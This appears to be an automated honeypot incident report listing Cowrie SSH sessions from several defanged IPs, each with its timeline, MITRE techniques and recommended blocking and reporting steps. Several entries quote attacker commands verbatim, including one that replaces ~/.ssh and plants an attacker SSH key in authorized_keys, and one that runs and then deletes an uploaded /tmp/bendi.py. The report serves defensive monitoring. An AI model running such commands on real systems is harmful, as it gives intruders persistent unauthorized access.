**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:26` | `cowrie.session.connect` |
| `2026-06-30 05:52:26` | `cowrie.client.version` |
| `2026-06-30 05:52:26` | `cowrie.client.kex` |
| `2026-06-30 05:52:27` | `cowrie.login.success` |
| `2026-06-30 05:52:29` | `cowrie.session.file_upload` |
| `2026-06-30 05:52:30` | `cowrie.session.params` |
| `2026-06-30 05:52:30` | `cowrie.command.input` |
| `2026-06-30 05:52:30` | `cowrie.command.input` |
| `2026-06-30 05:52:30` | `cowrie.command.input` |
| `2026-06-30 05:52:30` | `cowrie.command.failed` |
| `2026-06-30 05:52:30` | `cowrie.log.closed` |
| `2026-06-30 05:52:32` | `cowrie.session.params` |
| `2026-06-30 05:52:32` | `cowrie.command.input` |
| `2026-06-30 05:52:32` | `cowrie.log.closed` |
| `2026-06-30 05:52:33` | `cowrie.session.params` |
| `2026-06-30 05:52:33` | `cowrie.command.input` |
| `2026-06-30 05:52:33` | `cowrie.log.closed` |
| `2026-06-30 05:52:34` | `cowrie.session.params` |
| `2026-06-30 05:52:34` | `cowrie.command.input` |
| `2026-06-30 05:52:34` | `cowrie.command.failed` |
| `2026-06-30 05:52:34` | `cowrie.command.failed` |
| `2026-06-30 05:53:36` | `cowrie.session.params` |
| `2026-06-30 05:53:36` | `cowrie.command.input` |
| `2026-06-30 05:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd83d1ff1b5

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-06-30 05:54 |
| **Last Seen** | 2026-06-30 05:57 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:54:52` | `cowrie.session.connect` |
| `2026-06-30 05:54:52` | `cowrie.client.version` |
| `2026-06-30 05:54:52` | `cowrie.client.kex` |
| `2026-06-30 05:54:53` | `cowrie.login.success` |
| `2026-06-30 05:54:55` | `cowrie.session.file_upload` |
| `2026-06-30 05:54:56` | `cowrie.session.params` |
| `2026-06-30 05:54:56` | `cowrie.command.input` |
| `2026-06-30 05:54:56` | `cowrie.command.input` |
| `2026-06-30 05:54:56` | `cowrie.command.input` |
| `2026-06-30 05:54:56` | `cowrie.command.failed` |
| `2026-06-30 05:54:56` | `cowrie.log.closed` |
| `2026-06-30 05:54:57` | `cowrie.session.params` |
| `2026-06-30 05:54:57` | `cowrie.command.input` |
| `2026-06-30 05:54:57` | `cowrie.log.closed` |
| `2026-06-30 05:54:58` | `cowrie.session.params` |
| `2026-06-30 05:54:58` | `cowrie.command.input` |
| `2026-06-30 05:54:59` | `cowrie.log.closed` |
| `2026-06-30 05:55:00` | `cowrie.session.params` |
| `2026-06-30 05:55:00` | `cowrie.command.input` |
| `2026-06-30 05:55:00` | `cowrie.command.failed` |
| `2026-06-30 05:55:00` | `cowrie.command.failed` |
| `2026-06-30 05:56:01` | `cowrie.session.params` |
| `2026-06-30 05:56:01` | `cowrie.command.input` |
| `2026-06-30 05:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc8072f9f123

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 05:56 |
| **Last Seen** | 2026-06-30 05:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:56:43` | `cowrie.session.connect` |
| `2026-06-30 05:56:43` | `cowrie.client.version` |
| `2026-06-30 05:56:43` | `cowrie.client.kex` |
| `2026-06-30 05:56:45` | `cowrie.login.success` |
| `2026-06-30 05:56:47` | `cowrie.session.params` |
| `2026-06-30 05:56:47` | `cowrie.command.input` |
| `2026-06-30 05:56:47` | `cowrie.log.closed` |
| `2026-06-30 05:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f712bb014e5c

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-06-30 05:58 |
| **Last Seen** | 2026-06-30 05:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:58:45` | `cowrie.session.connect` |
| `2026-06-30 05:58:45` | `cowrie.client.version` |
| `2026-06-30 05:58:45` | `cowrie.client.kex` |
| `2026-06-30 05:58:46` | `cowrie.login.success` |
| `2026-06-30 05:58:47` | `cowrie.session.params` |
| `2026-06-30 05:58:47` | `cowrie.command.input` |
| `2026-06-30 05:58:47` | `cowrie.command.failed` |
| `2026-06-30 05:58:47` | `cowrie.log.closed` |
| `2026-06-30 05:58:48` | `cowrie.session.params` |
| `2026-06-30 05:58:48` | `cowrie.command.input` |
| `2026-06-30 05:58:48` | `cowrie.session.file_download` |
| `2026-06-30 05:58:48` | `cowrie.log.closed` |
| `2026-06-30 05:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8955cfd1b65

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-06-30 05:58 |
| **Last Seen** | 2026-06-30 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:58:49` | `cowrie.session.connect` |
| `2026-06-30 05:58:49` | `cowrie.client.version` |
| `2026-06-30 05:58:49` | `cowrie.client.kex` |
| `2026-06-30 05:58:50` | `cowrie.login.success` |
| `2026-06-30 05:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576d77ba13b9

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-06-30 05:58 |
| **Last Seen** | 2026-06-30 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:58:50` | `cowrie.session.connect` |
| `2026-06-30 05:58:50` | `cowrie.client.version` |
| `2026-06-30 05:58:50` | `cowrie.client.kex` |
| `2026-06-30 05:58:51` | `cowrie.login.success` |
| `2026-06-30 05:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15261467c0af

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 06:01 |
| **Last Seen** | 2026-06-30 06:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:01:17` | `cowrie.session.connect` |
| `2026-06-30 06:01:18` | `cowrie.client.version` |
| `2026-06-30 06:01:18` | `cowrie.client.kex` |
| `2026-06-30 06:01:24` | `cowrie.login.success` |
| `2026-06-30 06:01:27` | `cowrie.session.params` |
| `2026-06-30 06:01:27` | `cowrie.command.input` |
| `2026-06-30 06:01:29` | `cowrie.log.closed` |
| `2026-06-30 06:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4faa3274bda0

| Field | Detail |
|---|---|
| **Source IP** | `102.54.246[.]130` |
| **First Seen** | 2026-06-30 06:01 |
| **Last Seen** | 2026-06-30 06:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:01:55` | `cowrie.session.connect` |
| `2026-06-30 06:01:55` | `cowrie.client.version` |
| `2026-06-30 06:01:55` | `cowrie.client.kex` |
| `2026-06-30 06:01:56` | `cowrie.login.success` |
| `2026-06-30 06:01:56` | `cowrie.session.params` |
| `2026-06-30 06:01:56` | `cowrie.command.input` |
| `2026-06-30 06:01:56` | `cowrie.command.failed` |
| `2026-06-30 06:01:57` | `cowrie.log.closed` |
| `2026-06-30 06:01:57` | `cowrie.session.params` |
| `2026-06-30 06:01:57` | `cowrie.command.input` |
| `2026-06-30 06:01:58` | `cowrie.session.file_download` |
| `2026-06-30 06:01:58` | `cowrie.log.closed` |
| `2026-06-30 06:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.54.246[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.54.246[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec3c1ee08b9

| Field | Detail |
|---|---|
| **Source IP** | `102.54.246[.]130` |
| **First Seen** | 2026-06-30 06:01 |
| **Last Seen** | 2026-06-30 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:01:58` | `cowrie.session.connect` |
| `2026-06-30 06:01:58` | `cowrie.client.version` |
| `2026-06-30 06:01:58` | `cowrie.client.kex` |
| `2026-06-30 06:01:58` | `cowrie.login.success` |
| `2026-06-30 06:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.54.246[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.54.246[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d198c522fb1

| Field | Detail |
|---|---|
| **Source IP** | `102.54.246[.]130` |
| **First Seen** | 2026-06-30 06:01 |
| **Last Seen** | 2026-06-30 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:01:58` | `cowrie.session.connect` |
| `2026-06-30 06:01:58` | `cowrie.client.version` |
| `2026-06-30 06:01:59` | `cowrie.client.kex` |
| `2026-06-30 06:01:59` | `cowrie.login.success` |
| `2026-06-30 06:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.54.246[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.54.246[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff50b502650

| Field | Detail |
|---|---|
| **Source IP** | `218.203.249[.]149` |
| **First Seen** | 2026-06-30 06:07 |
| **Last Seen** | 2026-06-30 06:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:07:15` | `cowrie.session.connect` |
| `2026-06-30 06:07:17` | `cowrie.client.version` |
| `2026-06-30 06:07:17` | `cowrie.client.kex` |
| `2026-06-30 06:07:23` | `cowrie.login.success` |
| `2026-06-30 06:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.203.249[.]149` to AbuseIPDB if not already reported
- [ ] Block `218.203.249[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02670a19eb39

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-30 06:07 |
| **Last Seen** | 2026-06-30 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:07:26` | `cowrie.session.connect` |
| `2026-06-30 06:07:26` | `cowrie.client.version` |
| `2026-06-30 06:07:26` | `cowrie.client.kex` |
| `2026-06-30 06:07:26` | `cowrie.login.success` |
| `2026-06-30 06:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0196676fea0f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 06:12 |
| **Last Seen** | 2026-06-30 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:12:27` | `cowrie.session.connect` |
| `2026-06-30 06:12:28` | `cowrie.client.version` |
| `2026-06-30 06:12:28` | `cowrie.client.kex` |
| `2026-06-30 06:12:30` | `cowrie.login.success` |
| `2026-06-30 06:12:31` | `cowrie.session.params` |
| `2026-06-30 06:12:31` | `cowrie.command.input` |
| `2026-06-30 06:12:32` | `cowrie.log.closed` |
| `2026-06-30 06:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fae2a21c779

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 06:13 |
| **Last Seen** | 2026-06-30 06:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:13:44` | `cowrie.session.connect` |
| `2026-06-30 06:13:45` | `cowrie.client.version` |
| `2026-06-30 06:13:45` | `cowrie.client.kex` |
| `2026-06-30 06:13:52` | `cowrie.login.success` |
| `2026-06-30 06:13:55` | `cowrie.session.params` |
| `2026-06-30 06:13:55` | `cowrie.command.input` |
| `2026-06-30 06:13:57` | `cowrie.log.closed` |
| `2026-06-30 06:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c169b041ca69

| Field | Detail |
|---|---|
| **Source IP** | `59.152.168[.]184` |
| **First Seen** | 2026-06-30 06:20 |
| **Last Seen** | 2026-06-30 06:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:20:40` | `cowrie.session.connect` |
| `2026-06-30 06:20:40` | `cowrie.client.version` |
| `2026-06-30 06:20:40` | `cowrie.client.kex` |
| `2026-06-30 06:20:41` | `cowrie.login.success` |
| `2026-06-30 06:20:42` | `cowrie.session.params` |
| `2026-06-30 06:20:42` | `cowrie.command.input` |
| `2026-06-30 06:20:42` | `cowrie.command.failed` |
| `2026-06-30 06:20:42` | `cowrie.log.closed` |
| `2026-06-30 06:20:43` | `cowrie.session.params` |
| `2026-06-30 06:20:43` | `cowrie.command.input` |
| `2026-06-30 06:20:43` | `cowrie.session.file_download` |
| `2026-06-30 06:20:43` | `cowrie.log.closed` |
| `2026-06-30 06:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.152.168[.]184` to AbuseIPDB if not already reported
- [ ] Block `59.152.168[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0bb4c099a6a

| Field | Detail |
|---|---|
| **Source IP** | `59.152.168[.]184` |
| **First Seen** | 2026-06-30 06:20 |
| **Last Seen** | 2026-06-30 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:20:44` | `cowrie.session.connect` |
| `2026-06-30 06:20:44` | `cowrie.client.version` |
| `2026-06-30 06:20:44` | `cowrie.client.kex` |
| `2026-06-30 06:20:45` | `cowrie.login.success` |
| `2026-06-30 06:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.152.168[.]184` to AbuseIPDB if not already reported
- [ ] Block `59.152.168[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56cd2bd8441

| Field | Detail |
|---|---|
| **Source IP** | `59.152.168[.]184` |
| **First Seen** | 2026-06-30 06:20 |
| **Last Seen** | 2026-06-30 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:20:45` | `cowrie.session.connect` |
| `2026-06-30 06:20:45` | `cowrie.client.version` |
| `2026-06-30 06:20:45` | `cowrie.client.kex` |
| `2026-06-30 06:20:46` | `cowrie.login.success` |
| `2026-06-30 06:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.152.168[.]184` to AbuseIPDB if not already reported
- [ ] Block `59.152.168[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66d6d6ddc2b1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 06:26 |
| **Last Seen** | 2026-06-30 06:26 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:26:11` | `cowrie.session.connect` |
| `2026-06-30 06:26:12` | `cowrie.client.version` |
| `2026-06-30 06:26:12` | `cowrie.client.kex` |
| `2026-06-30 06:26:20` | `cowrie.login.success` |
| `2026-06-30 06:26:24` | `cowrie.session.params` |
| `2026-06-30 06:26:24` | `cowrie.command.input` |
| `2026-06-30 06:26:25` | `cowrie.log.closed` |
| `2026-06-30 06:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63530cd97251

| Field | Detail |
|---|---|
| **Source IP** | `192.142.52[.]45` |
| **First Seen** | 2026-06-30 06:26 |
| **Last Seen** | 2026-06-30 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:26:51` | `cowrie.session.connect` |
| `2026-06-30 06:26:51` | `cowrie.client.version` |
| `2026-06-30 06:26:51` | `cowrie.client.kex` |
| `2026-06-30 06:26:51` | `cowrie.login.success` |
| `2026-06-30 06:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.142.52[.]45` to AbuseIPDB if not already reported
- [ ] Block `192.142.52[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80fb51ee4016

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-30 06:26 |
| **Last Seen** | 2026-06-30 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:26:51` | `cowrie.session.connect` |
| `2026-06-30 06:26:51` | `cowrie.client.version` |
| `2026-06-30 06:26:51` | `cowrie.client.kex` |
| `2026-06-30 06:26:52` | `cowrie.login.success` |
| `2026-06-30 06:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12c651fd04d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 06:27 |
| **Last Seen** | 2026-06-30 06:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:27:56` | `cowrie.session.connect` |
| `2026-06-30 06:27:57` | `cowrie.client.version` |
| `2026-06-30 06:27:57` | `cowrie.client.kex` |
| `2026-06-30 06:27:59` | `cowrie.login.success` |
| `2026-06-30 06:28:01` | `cowrie.session.params` |
| `2026-06-30 06:28:01` | `cowrie.command.input` |
| `2026-06-30 06:28:02` | `cowrie.log.closed` |
| `2026-06-30 06:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00297a35b301

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:28 |
| **Last Seen** | 2026-06-30 06:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:28:29` | `cowrie.session.connect` |
| `2026-06-30 06:28:30` | `cowrie.login.failed` |
| `2026-06-30 06:28:31` | `cowrie.login.success` |
| `2026-06-30 06:28:32` | `cowrie.session.params` |
| `2026-06-30 06:28:32` | `cowrie.command.input` |
| `2026-06-30 06:28:32` | `cowrie.command.failed` |
| `2026-06-30 06:28:32` | `cowrie.command.input` |
| `2026-06-30 06:28:32` | `cowrie.command.failed` |
| `2026-06-30 06:28:33` | `cowrie.command.input` |
| `2026-06-30 06:28:33` | `cowrie.command.input` |
| `2026-06-30 06:28:33` | `cowrie.command.failed` |
| `2026-06-30 06:28:33` | `cowrie.command.failed` |
| `2026-06-30 06:29:04` | `cowrie.log.closed` |
| `2026-06-30 06:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8c2afb9e51

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:29 |
| **Last Seen** | 2026-06-30 06:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:29:04` | `cowrie.session.connect` |
